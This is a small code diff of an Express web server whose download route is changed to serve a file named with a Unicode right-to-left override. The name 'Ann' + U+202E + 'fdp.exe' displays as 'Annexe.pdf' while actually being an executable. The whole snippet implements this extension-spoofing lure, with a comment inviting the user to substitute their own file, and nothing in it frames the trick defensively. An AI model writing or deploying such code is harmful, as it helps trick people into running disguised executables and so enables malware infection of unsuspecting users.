@@ -10,8 +10,8 @@ const RLO = "\u202e";
 const filename = "Ann" + RLO + "fdp.exe";
 
 app.get("/download", (req, res) => {
-  const filePath = path.join(__dirname, "files", "filename"); // Change to your file
-  res.download(filePath, "filename"); // Triggers file download
+  const filePath = path.join(__dirname, "files", filename); // Change to your file
+  res.download(filePath, filename); // Triggers file download
 });
 
 // Start the server
